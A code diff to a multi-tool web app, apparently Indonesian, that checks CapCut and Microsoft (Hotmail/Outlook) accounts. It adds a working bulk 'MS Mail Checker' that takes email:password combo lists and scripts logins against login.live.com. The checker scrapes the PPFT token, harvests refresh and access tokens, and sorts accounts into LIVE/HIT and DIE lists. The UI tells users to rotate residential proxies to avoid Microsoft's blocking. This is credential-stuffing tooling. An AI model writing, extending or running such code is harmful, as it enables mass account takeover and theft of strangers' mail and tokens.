@@ -75,11 +75,12 @@ def check_capcut_account(email, password, proxy_template=None, max_ip_retries=6,
     email = (email or "").strip()
     password = (password or "").strip()
     out = {"ok": False, "email": email, "user_id": "", "plan": "", "expiry": "",
-           "is_pro": False, "error": ""}
+           "is_pro": False, "error": "", "bytes_used": 0}
     if not email or not password:
         out["error"] = "missing email/password"
         return out
     last_err = "login failed"
+    total_bytes = 0
     for _ in range(max(1, int(max_ip_retries or 1))):
         sid = _sess_id()
         s = requests.Session()
@@ -95,6 +96,8 @@ def check_capcut_account(email, password, proxy_template=None, max_ip_retries=6,
                     "fixed_mix_mode": "1"}
             hdr = dict(_WEB_HDR); hdr["Content-Type"] = "application/x-www-form-urlencoded"
             r = s.post(url, data=data, headers=hdr, timeout=timeout)
+            if prox:
+                total_bytes += len(r.content) + 500
             try:
                 j = r.json()
             except Exception:
@@ -108,14 +111,18 @@ def check_capcut_account(email, password, proxy_template=None, max_ip_retries=6,
                     continue
                 if dd.get("captcha"):
                     out["error"] = "captcha required"
+                    out["bytes_used"] = total_bytes
                     return out
                 out["error"] = "login failed: %s" % (dd.get("description")
                                                      or j.get("message") or "invalid credentials")
+                out["bytes_used"] = total_bytes
                 return out
             out["user_id"] = dd.get("user_id_str") or (str(dd.get("user_id")) if dd.get("user_id") else "")
             body = {"scene": ["vip", "workspace"], "vip_levels": ["vip"], "app_id": int(CAPCUT_AID)}
             hdr2 = dict(_WEB_HDR); hdr2["Content-Type"] = "application/json"
             sr = s.post(SUB_URL, json=body, headers=hdr2, timeout=timeout)
+            if prox:
+                total_bytes += len(sr.content) + 500
             sj = sr.json()
             vip = ((((sj.get("data") or {}).get("subscription_user_infos") or {})
                     .get("vip") or {}).get("vip_infos")) or []
@@ -135,11 +142,13 @@ def check_capcut_account(email, password, proxy_template=None, max_ip_retries=6,
                 out["expiry"] = "-"
             _logout(s)
             out["ok"] = True
+            out["bytes_used"] = total_bytes
             return out
         except Exception:
             last_err = "network/proxy error"
             continue
     out["error"] = last_err
+    out["bytes_used"] = total_bytes
     return out
 
 _CC_EMAIL_RE = re.compile(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}")
@@ -432,6 +441,214 @@ def fetch_message_detail(message_id: str, refresh_token: str, client_id: str = D
         }
     except Exception as e:
         return {"ok": False, "error": str(e)}
+
+
+# ==================== HOTMAIL / OUTLOOK (EMAIL:PASS) CORE LOGIC ====================
+COUNTRY_MAP = {
+    "BR": "Brasil", "US": "United States", "PT": "Portugal", "AR": "Argentina",
+    "MX": "Mexico", "CO": "Colombia", "CL": "Chile", "PE": "Peru", "VE": "Venezuela",
+    "UY": "Uruguay", "PY": "Paraguay", "BO": "Bolivia", "EC": "Ecuador",
+    "GB": "United Kingdom", "IE": "Ireland", "FR": "France", "DE": "Germany",
+    "IT": "Italy", "ES": "Spain", "NL": "Netherlands", "BE": "Belgium",
+    "CH": "Switzerland", "AT": "Austria", "SE": "Sweden", "NO": "Norway",
+    "DK": "Denmark", "FI": "Finland", "PL": "Poland", "RU": "Russia",
+    "UA": "Ukraine", "TR": "Turkey", "GR": "Greece", "RO": "Romania",
+    "CA": "Canada", "AU": "Australia", "NZ": "New Zealand", "JP": "Japan",
+    "KR": "South Korea", "CN": "China", "IN": "India", "ID": "Indonesia",
+    "PH": "Philippines", "TH": "Thailand", "VN": "Vietnam", "MY": "Malaysia",
+    "SG": "Singapore", "ZA": "South Africa", "EG": "Egypt", "NG": "Nigeria",
+    "MA": "Morocco", "DZ": "Algeria", "TN": "Tunisia", "IL": "Israel",
+    "SA": "Saudi Arabia", "AE": "UAE", "QA": "Qatar",
+    "KW": "Kuwait", "PK": "Pakistan", "BD": "Bangladesh", "LK": "Sri Lanka",
+    "UN": "Unknown", "": "Unknown"
+}
+
+def country_name(code: str) -> str:
+    if not code:
+        return "Unknown"
+    code = code.strip().upper()
+    return COUNTRY_MAP.get(code, code)
+
+def _hm_g_s(t, i, f):
+    try:
+        return t.split(i)[1].split(f)[0]
+    except Exception:
+        return ""
+
+def _hm_e_p(h):
+    p = _hm_g_s(h, 'name="PPFT" id="i0327" value="', '"')
+    if not p:
+        p = _hm_g_s(h, 'name=\\"PPFT\\" id=\\"i0327\\" value=\\"', '\\"')
+    if not p:
+        m = re.search(r'sFT\s*:\s*["\'](.*?)["\']', h)
+        if m:
+            p = m.group(1)
+    return p
+
+def _hm_e_u(h):
+    u = _hm_g_s(h, 'urlPost:"', '"')
+    if not u:
+        m = re.search(r'["\']urlPost(?:Msa)?["\']\s*:\s*["\']([^"\']+)', h)
+        if m:
+            u = m.group(1)
+    return u
+
+def _hm_l_h(s, u, p, proxy_url=None, timeout=15):
+    bytes_count = 0
+    try:
+        prox = {"http": proxy_url, "https": proxy_url} if proxy_url else None
+        headers = {
+            "User-Agent": UA,
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9"
+        }
+        r = s.get("https://login.live.com/login.srf", headers=headers, timeout=timeout, proxies=prox)
+        if prox: bytes_count += len(r.content) + 500
+        f = _hm_e_p(r.text)
+        up = _hm_e_u(r.text) or "https://login.live.com/ppsecure/post.srf"
+        o = f"{up}?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch"
+        data_payload = {
+            "ps": "2",
+            "PPFT": f,
+            "login": u,
+            "loginfmt": u,
+            "type": "11",
+            "LoginOptions": "1",
+            "passwd": p
+        }
+        r1 = s.post(o, data=data_payload, headers=headers, timeout=timeout, allow_redirects=False, proxies=prox)
+        if prox: bytes_count += len(r1.content) + 500
+        src = r1.text
+        if "privacynotice" in src:
+            p_u = _hm_g_s(src, 'action="', '"').replace("&amp;", "&")
+            p_c = _hm_g_s(src, 'name="code" id="code" value="', '"')
+            p_i = _hm_g_s(src, 'name="correlation_id" id="correlation_id" value="', '"')
+            if p_u and p_c:
+                rp = s.post(p_u, data={"correlation_id": p_i, "code": p_c}, headers=headers, timeout=timeout, proxies=prox)
+                if prox: bytes_count += len(rp.content) + 500
+        if "incorrect" in src or "Wrong password" in src or "doesn't exist" in src or "isn't correct" in src:
+            return {"error": "Incorrect password / Email does not exist", "status": "die", "bytes": bytes_count}
+        f2 = _hm_e_p(src)
+        u2 = _hm_e_u(src)
+        if f2 and u2:
+            r2 = s.post(u2, data={"login": u, "passwd": p, "PPFT": f2, "ps": "2"}, headers=headers, timeout=timeout, allow_redirects=False, proxies=prox)
+            if prox: bytes_count += len(r2.content) + 500
+        a = {"client_id": "0000000048170EF2", "redirect_uri": "https://login.live.com/oauth20_desktop.srf", "response_type": "token", "scope": "service::outlook.office.com::MBI_SSL"}
+        ra = s.get("https://login.live.com/oauth20_authorize.srf", params=a, headers=headers, timeout=timeout, allow_redirects=False, proxies=prox)
+        if prox: bytes_count += len(ra.content) + 500
+        l = ra.headers.get("Location", "")
+        t = re.search(r'refresh_token=([^&\s#]+)', unquote(l))
+        if t:
+            return {"refresh_token": t.group(1), "status": "live", "bytes": bytes_count}
+        if "ANON" in s.cookies:
+            return {"status": "live", "info": "L|S_T", "bytes": bytes_count}
+        return {"error": "Login failed / Security checkpoint", "status": "die", "bytes": bytes_count}
+    except Exception as e:
+        err_msg = str(e)
+        if "SSLError" in err_msg or "handshake" in err_msg.lower():
+            return {"error": "Rate limit / SSL blocked by Microsoft (Gunakan Proxy)", "status": "die", "bytes": bytes_count}
+        return {"error": err_msg[:60], "status": "die", "bytes": bytes_count}
+
+def _hm_g_a(s, r, proxy_url=None, timeout=15):
+    try:
+        prox = {"http": proxy_url, "https": proxy_url} if proxy_url else None
+        y = f"grant_type=refresh_token&client_id=0000000048170EF2&scope=https%3A%2F%2Fsubstrate.office.com%2FUser-Internal.ReadWrite&refresh_token={r}"
+        res = s.post("https://login.live.com/oauth20_token.srf", data=y, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=timeout, proxies=prox)
+        b = (len(res.content) + 500) if prox else 0
+        return res.json().get("access_token", ""), b
+    except Exception:
+        return "", 0
+
+def _hm_get_country(s, at, cid, proxy_url=None, timeout=10):
+    b = 0
+    prox = {"http": proxy_url, "https": proxy_url} if proxy_url else None
+    headers = {"Authorization": f"Bearer {at}", "X-AnchorMailbox": f"CID:{cid}", "Accept": "application/json"}
+    try:
+        res = s.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=timeout, proxies=prox)
+        if prox: b += len(res.content) + 500
+        if res.status_code == 200:
+            r = res.json()
+            l = r.get("accounts", [{}])[0].get("location", "") or r.get("preferences", {}).get("location", "")
+            if l:
+                return l, b
+    except Exception:
+        pass
+    try:
+        res = s.get("https://outlook.live.com/owa/?nlp=1&offline=1", headers=headers, timeout=timeout, proxies=prox)
+        if prox: b += len(res.content) + 500
+        m = re.search(r'"Country":"([A-Z]{2})"', res.text)
+        if m:
+            return m.group(1), b
+    except Exception:
+        pass
+    return "UN", b
+
+def check_single_hotmail(email: str, password: str, proxy_url: Optional[str] = None, timeout: int = 15) -> Dict[str, Any]:
+    email = (email or "").strip()
+    password = (password or "").strip()
+    if not email or not password:
+        return {"ok": False, "live": False, "email": email, "password": password, "status": "die", "country": "UN", "country_name": "Unknown", "motivo": "Missing email/password", "bytes_used": 0}
+    try:
+        resolved_proxy = None
+        if proxy_url and str(proxy_url).strip():
+            try:
+                resolved_proxy = parse_proxy_spec(str(proxy_url).strip()).url
+            except Exception:
+                resolved_proxy = str(proxy_url).strip()
+        s = requests.Session()
+        r = _hm_l_h(s, email, password, resolved_proxy, timeout=timeout)
+        total_bytes = r.get("bytes", 0)
+        if r.get("status") == "live":
+            ct = "UN"
+            t = r.get("refresh_token")
+            cid = s.cookies.get("MSPCID", "").upper()
+            result_msg = "Login OK"
+            if t and cid:
+                at, b1 = _hm_g_a(s, t, proxy_url, timeout=timeout)
+                total_bytes += b1
+                if at:
+                    ct, b2 = _hm_get_country(s, at, cid, proxy_url, timeout=timeout)
+                    total_bytes += b2
+                    if ct and ct != "UN":
+                        result_msg = f"Login OK | 🌍 Negara: {country_name(ct)} ({ct})"
+                    else:
+                        result_msg = "Login OK | 🌍 Negara: N/A"
+            return {
+                "ok": True,
+                "live": True,
+                "email": email,
+                "password": password,
+                "status": "live",
+                "country": ct,
+                "country_name": country_name(ct),
+                "motivo": result_msg,
+                "refresh_token": t or "",
+                "bytes_used": total_bytes
+            }
+        else:
+            return {
+                "ok": True,
+                "live": False,
+                "email": email,
+                "password": password,
+                "status": "die",
+                "country": "UN",
+                "country_name": "Unknown",
+                "motivo": r.get("error", "Login failed"),
+                "bytes_used": total_bytes
+            }
+    except Exception as e:
+        return {
+            "ok": True,
+            "live": False,
+            "email": email,
+            "password": password,
+            "status": "die",
+            "country": "UN",
+            "country_name": "Unknown",
+            "motivo": str(e)[:60],
+            "bytes_used": 0
+        }
 
 
 # ==================== 2FA TOTP & PROXY CHECKER CORE LOGIC ====================
@@ -1593,7 +1810,10 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       <div class="navbar-tabs-container">
         <div class="nav-tabs-custom" id="mainTabs">
           <button type="button" class="nav-tab-btn active" id="btn-tab-mail" onclick="switchTab('mail')">
-            <i class="fa-solid fa-inbox me-1.5 text-warning"></i><span data-i18n="tab_mail">Mail Checker</span>
+            <i class="fa-solid fa-inbox me-1.5 text-warning"></i><span data-i18n="tab_mail">Mail Reader</span>
+          </button>
+          <button type="button" class="nav-tab-btn" id="btn-tab-hotmail" onclick="switchTab('hotmail')">
+            <i class="fa-brands fa-microsoft me-1.5 text-warning"></i><span data-i18n="tab_hotmail">MS Mail Checker</span>
           </button>
           <button type="button" class="nav-tab-btn" id="btn-tab-capcut" onclick="switchTab('capcut')">
             <i class="fa-solid fa-film me-1.5 text-warning"></i><span data-i18n="tab_capcut">CapCut Checker</span>
@@ -1618,7 +1838,10 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         </button>
         <div class="mobile-tab-menu" id="mobileTabMenuList">
           <div class="mobile-tab-item active" onclick="selectMobileTab('mail', event)">
-            <i class="fa-solid fa-inbox text-warning me-2"></i><span data-i18n="tab_mail">Mail Checker</span>
+            <i class="fa-solid fa-inbox text-warning me-2"></i><span data-i18n="tab_mail">Mail Reader</span>
+          </div>
+          <div class="mobile-tab-item" onclick="selectMobileTab('hotmail', event)">
+            <i class="fa-brands fa-microsoft text-warning me-2"></i><span data-i18n="tab_hotmail">MS Mail Checker</span>
           </div>
           <div class="mobile-tab-item" onclick="selectMobileTab('capcut', event)">
             <i class="fa-solid fa-film text-warning me-2"></i><span data-i18n="tab_capcut">CapCut Checker</span>
@@ -1778,6 +2001,154 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       </div>
     </div>
 
+    <!-- TAB: HOTMAIL / OUTLOOK (EMAIL:PASS) CHECKER -->
+    <div id="tab-hotmail" class="tab-pane-custom">
+      <div class="capcut-container">
+        <div class="row g-4">
+          
+          <div class="col-lg-5">
+            <div class="card card-theme p-4 shadow-sm">
+              <div class="d-flex justify-content-between align-items-center mb-2">
+                <h5 class="fw-bold mb-0 text-warning"><i class="fa-brands fa-microsoft me-2"></i><span data-i18n="hm_card_title">MS Mail Checker</span></h5>
+                <span class="badge bg-dark border border-warning text-warning px-2 py-1 small">EMAIL:PASS</span>
+              </div>
+              <p class="text-secondary small mb-3" data-i18n="hm_desc">
+                Cek validitas login akun Microsoft (Hotmail / Outlook / Live / MSN) format <code>email:password</code> atau <code>email|password</code> & deteksi Negara/Lokasi.
+              </p>
+              
+              <div class="mb-3">
+                <div class="d-flex justify-content-between align-items-center mb-1">
+                  <label class="form-label text-secondary small fw-semibold mb-0" data-i18n="hm_acc_label">DAFTAR AKUN (email:pass / email|pass)</label>
+                  <div class="d-flex gap-2">
+                    <button class="btn btn-sm btn-link text-warning p-0 text-decoration-none small" onclick="loadSampleHotmail()">Sample</button>
+                    <button class="btn btn-sm btn-link text-secondary p-0 text-decoration-none small" onclick="clearHotmailInput()">Clear</button>
+                  </div>
+                </div>
+                <textarea id="hotmailAccountsInput" class="form-control form-control-theme" rows="7" data-i18n-ph="hm_acc_ph" placeholder="user1@hotmail.com:password123&#10;user2@outlook.com|password456" oninput="updateHotmailCount()"></textarea>
+                <div class="d-flex justify-content-between mt-1">
+                  <small id="hotmailAccountCount" class="text-muted">Total: 0 akun</small>
+                </div>
+              </div>
+
+              <!-- Proxy Settings for Hotmail -->
+              <div class="mb-3 p-2 bg-dark rounded border border-secondary">
+                <div class="form-check form-switch mb-2">
+                  <input class="form-check-input" type="checkbox" id="useHotmailProxyToggle" onchange="toggleHotmailProxyField()">
+                  <label class="form-check-label small fw-semibold text-warning" for="useHotmailProxyToggle" data-i18n="hm_use_proxy_label">Gunakan Proxy (Disarankan)</label>
+                </div>
+                <div id="hotmailProxyFieldContainer" style="display: none;">
+                  <div class="d-flex justify-content-between align-items-center mb-1">
+                    <label class="form-label text-secondary small fw-semibold mb-0" data-i18n="hm_proxy_label">RESIDENTIAL PROXY (HTTP/SOCKS5)</label>
+                    <div class="d-flex gap-2 align-items-center">
+                      <label for="hotmailProxyFileInput" class="btn btn-sm btn-outline-warning py-0 px-1" style="font-size: 0.72rem; cursor: pointer;">
+                        <i class="fa-solid fa-file-arrow-up me-1"></i>Upload .txt
+                      </label>
+                      <input type="file" id="hotmailProxyFileInput" accept=".txt" style="display: none;" onchange="handleHotmailProxyFileUpload(event)">
+                      <button class="btn btn-sm btn-link text-secondary p-0 text-decoration-none" style="font-size: 0.72rem;" onclick="document.getElementById('hotmailProxyInput').value=''; updateHotmailProxyCount();">Clear</button>
+                    </div>
+                  </div>
+                  <textarea id="hotmailProxyInput" class="form-control form-control-sm form-control-theme mb-1 font-monospace" rows="2" placeholder="http://username:password@gw.dataimpulse.com:823 atau list proxy (1 per baris)" oninput="updateHotmailProxyCount()">{{ default_proxy }}</textarea>
+                  <div class="d-flex justify-content-between align-items-center mb-2">
+                    <small id="hotmailProxyCountLabel" class="text-muted" style="font-size: 0.72rem;">Wajib Residential Proxy (DataImpulse, dll) agar tidak diblokir Microsoft.</small>
+                    <small class="text-secondary" style="font-size: 0.7rem;">Rotasi Otomatis</small>
+                  </div>
+                  
+                  <div class="d-flex align-items-center justify-content-between p-2 rounded bg-black border border-secondary">
+                    <div class="d-flex align-items-center gap-1.5">
+                      <i class="fa-solid fa-chart-pie text-info small"></i>
+                      <span class="small text-secondary fw-semibold" style="font-size: 0.75rem;">KUOTA PROXY:</span>
+                    </div>
+                    <div class="d-flex align-items-center gap-2">
+                      <span id="hotmailProxyUsageBadge" class="badge bg-dark border border-info text-info font-monospace" style="font-size: 0.78rem;">0 B</span>
+                      <button class="btn btn-sm btn-link text-secondary p-0 text-decoration-none" onclick="resetHotmailProxyUsage()" title="Reset Pemakaian">
+                        <i class="fa-solid fa-rotate-left fa-xs text-warning"></i>
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="row g-2 mb-3">
+                <div class="col-6">
+                  <label class="form-label text-secondary small fw-semibold" data-i18n="hm_threads_label">THREADS</label>
+                  <input type="number" id="hotmailWorkersInput" class="form-control form-control-theme" value="3" min="1" max="6">
+                </div>
+                <div class="col-6">
+                  <label class="form-label text-secondary small fw-semibold" data-i18n="hm_timeout_label">TIMEOUT (s)</label>
+                  <input type="number" id="hotmailTimeoutInput" class="form-control form-control-theme" value="15" min="5" max="45">
+                </div>
+              </div>
+
+              <div class="d-flex gap-2">
+                <button id="btnStartHotmail" class="btn btn-gold flex-grow-1 py-2" onclick="startHotmailChecking()">
+                  <i class="fa-solid fa-play me-2"></i><span data-i18n="hm_btn_start">Mulai Check MS Mail</span>
+                </button>
+                <button id="btnStopHotmail" class="btn btn-outline-secondary py-2" onclick="stopHotmailChecking()" disabled>
+                  <i class="fa-solid fa-stop me-2"></i><span data-i18n="hm_btn_stop">Stop</span>
+                </button>
+              </div>
+
+              <!-- Animated Live Progress Bar -->
+              <div class="cc-progress-container" id="hotmailProgressBox" style="display: none; margin-top: 12px; background: #110a06; border: 1px solid var(--border-bronze); border-radius: 10px; padding: 12px;">
+                <div class="d-flex justify-content-between align-items-center mb-1 small">
+                  <span class="text-warning fw-semibold"><i class="fa-solid fa-spinner fa-spin me-1"></i>Checking...</span>
+                  <span id="hotmailProgressText" class="font-monospace text-light">0/0 (0%)</span>
+                </div>
+                <div class="progress bg-dark" style="height: 8px; border: 1px solid var(--border-bronze); border-radius: 6px; overflow: hidden;">
+                  <div class="cc-progress-bar" id="hotmailProgressBar" style="width: 0%; height: 8px; border-radius: 6px; background: linear-gradient(90deg, #10b981, #059669); box-shadow: 0 0 10px rgba(16, 185, 129, 0.35); transition: width 0.2s ease;"></div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="col-lg-7">
+            <div class="card card-theme p-4 shadow-sm">
+              <div class="d-flex justify-content-between align-items-center mb-3">
+                <h5 class="fw-bold mb-0 text-warning"><i class="fa-solid fa-square-poll-vertical me-2"></i><span data-i18n="hm_results_title">Hasil Pengecekan MS Mail</span></h5>
+                <div class="d-flex gap-2">
+                  <button class="btn btn-sm btn-outline-gold" onclick="downloadField('hotmailLiveResult', 'hotmail_live.txt')">
+                    <i class="fa-solid fa-download me-1"></i><span data-i18n="hm_btn_dl_live">Save LIVE (.txt)</span>
+                  </button>
+                </div>
+              </div>
+
+              <!-- LIVE Accounts Result -->
+              <div class="mb-3">
+                <div class="d-flex justify-content-between align-items-center mb-1">
+                  <span class="fw-bold text-success">
+                    <i class="fa-solid fa-circle-check me-1"></i><span data-i18n="hm_live_title">LIVE / HIT</span> 
+                    <span id="hotmailLiveCount" class="badge bg-success badge-counter ms-1">0</span>
+                  </span>
+                  <div class="btn-group btn-group-sm">
+                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="copyField('hotmailLiveResult')" data-i18n="hm_btn_copy">Copy</button>
+                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="downloadField('hotmailLiveResult', 'hotmail_live.txt')" data-i18n="hm_btn_save">Save</button>
+                  </div>
+                </div>
+                <textarea id="hotmailLiveResult" class="form-control form-control-theme border-success" rows="6" readonly data-i18n-ph="hm_live_ph" placeholder="Akun LIVE (berhasil login + negara) akan muncul di sini..."></textarea>
+              </div>
+
+              <!-- DIE / ERROR Accounts Result -->
+              <div>
+                <div class="d-flex justify-content-between align-items-center mb-1">
+                  <span class="fw-bold text-danger">
+                    <i class="fa-solid fa-circle-xmark me-1"></i><span data-i18n="hm_die_title">DIE / WRONG PASS</span>
+                    <span id="hotmailDieCount" class="badge bg-danger badge-counter ms-1">0</span>
+                  </span>
+                  <div class="btn-group btn-group-sm">
+                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="copyField('hotmailDieResult')" data-i18n="hm_btn_copy">Copy</button>
+                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="downloadField('hotmailDieResult', 'hotmail_die.txt')" data-i18n="hm_btn_save">Save</button>
+                  </div>
+                </div>
+                <textarea id="hotmailDieResult" class="form-control form-control-theme border-danger" rows="5" readonly data-i18n-ph="hm_die_ph" placeholder="Akun DIE (salah password / tidak ada) akan muncul di sini..."></textarea>
+              </div>
+
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+
     <!-- TAB 2: CAPCUT CHECKER -->
     <div id="tab-capcut" class="tab-pane-custom">
       <div class="capcut-container">
@@ -1797,9 +2168,22 @@ HTML_TEMPLATE = """<!DOCTYPE html>
               </div>
 
               <div class="mb-3">
-                <label class="form-label text-secondary small fw-semibold" data-i18n="cc_proxy_label">RESIDENTIAL PROXY URL (Wajib)</label>
-                <input type="text" id="ccProxyInput" class="form-control form-control-theme" placeholder="http://user-session-{sess}:pass@gate.provider.com:7000" value="{{ default_proxy }}">
-                <small class="text-muted" style="font-size: 0.75rem;" data-i18n="cc_proxy_help">Gunakan token <code>{sess}</code> untuk rotasi IP otomatis.</small>
+                <label class="form-label text-secondary small fw-semibold mb-1" data-i18n="cc_proxy_label">RESIDENTIAL PROXY URL (Wajib)</label>
+                <input type="text" id="ccProxyInput" class="form-control form-control-theme mb-1" placeholder="http://user-session-{sess}:pass@gate.provider.com:7000" value="{{ default_proxy }}">
+                <small class="text-muted d-block mb-2" style="font-size: 0.75rem;" data-i18n="cc_proxy_help">Gunakan token <code>{sess}</code> untuk rotasi IP otomatis.</small>
+
+                <div class="d-flex align-items-center justify-content-between p-2 rounded bg-black border border-secondary">
+                  <div class="d-flex align-items-center gap-1.5">
+                    <i class="fa-solid fa-chart-pie text-info small"></i>
+                    <span class="small text-secondary fw-semibold" style="font-size: 0.75rem;">KUOTA PROXY:</span>
+                  </div>
+                  <div class="d-flex align-items-center gap-2">
+                    <span id="ccProxyUsageBadge" class="badge bg-dark border border-info text-info font-monospace" style="font-size: 0.78rem;">0 B</span>
+                    <button class="btn btn-sm btn-link text-secondary p-0 text-decoration-none" onclick="resetCapcutProxyUsage()" title="Reset Pemakaian">
+                      <i class="fa-solid fa-rotate-left fa-xs text-warning"></i>
+                    </button>
+                  </div>
+                </div>
               </div>
 
               <div class="row g-2 mb-3">
@@ -2229,7 +2613,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
   <script>
     /* ================= INTERNATIONALIZATION (i18n) ================= */
-    const I18N_DICTS = {"id": {"brand_sub": "MULTI TOOLS • LAYANAN SOSMED", "tab_mail": "Mail Checker", "tab_capcut": "CapCut Checker", "tab_2fa": "2FA Generator", "tab_proxy": "Proxy Checker", "tm_accounts_title": "Accounts", "tm_clear_all_title": "Hapus Semua Akun", "tm_search_acc_ph": "Cari email akun...", "tm_upload_txt": "Upload .TXT", "tm_upload_txt_title": "Upload File .TXT (Bulk Auto-read)", "tm_add_btn": "Add", "tm_add_btn_title": "Tambah Akun Manual", "tm_mode_search": "Mode: Cari Email", "tm_mode_all": "Mode: Semua Akun", "tm_show_all": "Tampilkan Semua", "tm_search_only": "Mode Cari Saja", "tm_empty_acc_msg": "Belum ada akun.<br>Upload file <b>.TXT</b> atau klik <b>Add</b>.", "tm_inbox_title": "INBOX", "tm_btn_accounts": "Akun", "tm_filter_msg_ph": "Filter pengirim / subjek...", "tm_empty_inbox_select": "Pilih akun di sebelah kiri untuk melihat pesan inbox.", "tm_active_email_placeholder": "Pilih Akun", "tm_badge_standby": "● Standby", "tm_badge_connected": "● Connected", "tm_badge_disconnected": "● Disconnected", "tm_btn_copy": "Copy", "tm_no_email_selected": "Belum ada email yang dipilih", "tm_click_inbox_hint": "Klik salah satu email dari daftar inbox untuk membaca isi surat.", "tm_otp_detected": "KODE VERIFIKASI / OTP TERDETEKSI", "tm_btn_copy_otp": "Salin OTP", "tm_copied": "Disalin!", "tm_search_another_title": "Cari Akun Lain", "tm_search_another_desc": "Ketik email di kolom pencarian di atas untuk memilih akun.", "tm_accounts_avail": "Akun Tersedia", "tm_inbox_empty": "Inbox kosong.", "tm_no_msg_filter": "Tidak ada pesan yang cocok dengan filter.", "tm_no_acc_match": "Tidak ada akun yang cocok dengan", "tm_delete_acc_confirm": "Hapus {email} dari daftar?", "tm_clear_all_confirm": "Hapus semua daftar akun Mail Checker?", "tm_extracting": "Mengekstrak & memeriksa akun...", "tm_modal_add_title": "Add Outlook / Hotmail Accounts", "tm_modal_upload_label": "UPLOAD FILE .TXT (Bulk Import)", "tm_modal_paste_label": "ATAU PASTE TOKENS (email|pass|refresh_token|client_id atau token saja)", "tm_modal_proxy_label": "PROXY (Opsional: http://user:pass@host:port)", "tm_modal_proxy_ph": "Kosongkan jika direct", "tm_modal_btn_cancel": "Batal", "tm_modal_btn_import": "Import & Check", "cc_card_title": "Input Akun CapCut", "cc_acc_label": "DAFTAR AKUN (email:pass, email|pass, dll)", "cc_acc_ph": "user1@example.com:password123\\nuser2@example.com|password456", "cc_proxy_label": "RESIDENTIAL PROXY URL (Wajib)", "cc_proxy_help": "Gunakan token <code>{sess}</code> untuk rotasi IP otomatis.", "cc_threads_label": "THREADS", "cc_retries_label": "IP RETRIES", "cc_btn_start": "Mulai Check CapCut", "cc_btn_stop": "Stop", "cc_results_title": "Hasil Pengecekan CapCut", "cc_pro_title": "PRO / VIP", "cc_pro_ph": "Akun PRO akan muncul di sini...", "cc_free_title": "FREE / REGULAR", "cc_free_ph": "Akun FREE akan muncul di sini...", "cc_dead_title": "DEAD / ERROR", "cc_dead_ph": "Akun Gagal akan muncul di sini...", "cc_btn_copy": "Copy", "cc_btn_save": "Save", "cc_alert_empty": "Silakan masukkan daftar akun CapCut!", "cc_alert_no_valid": "Tidak ada akun valid yang ditemukan!", "tfa_single_title": "Quick 2FA Code (Single)", "tfa_single_desc": "Masukkan 2FA Secret Key (Base32) untuk mendapatkan kode verifikasi 6 digit instan.", "tfa_single_label": "2FA SECRET KEY", "tfa_single_ph": "Contoh: JBSWY3DPEHPK3PXP", "tfa_btn_get": "Get Code", "tfa_auth_code_label": "AUTHENTICATOR CODE", "tfa_btn_copy_code": "Salin Kode", "tfa_bulk_title": "Bulk 2FA Generator", "tfa_bulk_desc": "Mendukung paste banyak Secret Key atau baris combo (format <code>email|pass|secret</code> atau secret per baris).", "tfa_bulk_label": "INPUT LIST SECRETS / COMBOS", "tfa_bulk_ph": "Contoh format:\\nuser1@email.com|pass1|JBSWY3DPEHPK3PXP\\nuser2@email.com:pass2:4X72J6...\\nHXDMVJZTGNCDESRR...", "tfa_btn_gen_all": "Generate All Codes", "tfa_bulk_res_label": "HASIL (FORMAT COMBO + 2FA CODE)", "tfa_bulk_res_ph": "Hasil kode 2FA akan muncul di sini...", "tfa_alert_empty_single": "Silakan masukkan 2FA Secret Key!", "tfa_alert_empty_bulk": "Silakan masukkan list secret / combo!", "tfa_processing": "Memproses...", "prx_title": "Proxy Checker", "prx_desc": "Dukungan format: <code>HOST:PORT</code>, <code>HOST:PORT:USER:PASS</code>, <code>USER:PASS:HOST:PORT</code>, atau <code>scheme://...</code>", "prx_input_label": "INPUT PROXY LIST", "prx_btn_sample": "Sample", "prx_btn_clear": "Clear", "prx_input_ph": "Contoh format:\\n192.168.1.1:8080\\n192.168.1.1:8080:username:password\\nusername:password:192.168.1.1:8080\\nhttp://user:pass@192.168.1.1:8080", "prx_threads_label": "THREADS", "prx_timeout_label": "TIMEOUT (s)", "prx_scamalytics_toggle": "Scamalytics Fraud Score Check", "prx_btn_start": "Start Checking", "prx_btn_stop": "Stop", "prx_stat_total": "TOTAL", "prx_stat_live": "LIVE", "prx_stat_dead": "DEAD", "prx_stat_latency": "AVG LATENCY", "prx_stat_clean": "LOW FRAUD (<25)", "prx_filter_all": "All", "prx_filter_live": "Live", "prx_filter_dead": "Dead", "prx_filter_clean": "Low Fraud", "prx_search_ph": "Cari IP / Negara...", "prx_btn_export": "Export", "prx_exp_live_raw": "Copy Live (Original Format)", "prx_exp_live_ipport": "Copy Live (HOST:PORT)", "prx_exp_live_txt": "Download Live (.TXT)", "prx_exp_report_json": "Download Full Report (.JSON)", "prx_th_proxy": "PROXY", "prx_th_status": "STATUS", "prx_th_ping": "PING", "prx_th_loc": "EXIT IP & LOCATION", "prx_th_isp": "ISP / ORG", "prx_th_fraud": "FRAUD RISK", "prx_th_act": "ACT", "prx_empty_table": "Belum ada proxy yang diperiksa. Masukkan list proxy dan klik <b>Start Checking</b>.", "prx_no_match": "Tidak ada proxy yang cocok dengan filter atau pencarian.", "prx_modal_title": "Proxy Diagnostic Details", "prx_modal_close": "Tutup", "prx_alert_empty": "Silakan masukkan list proxy!", "prx_no_live_copy": "Tidak ada proxy LIVE untuk 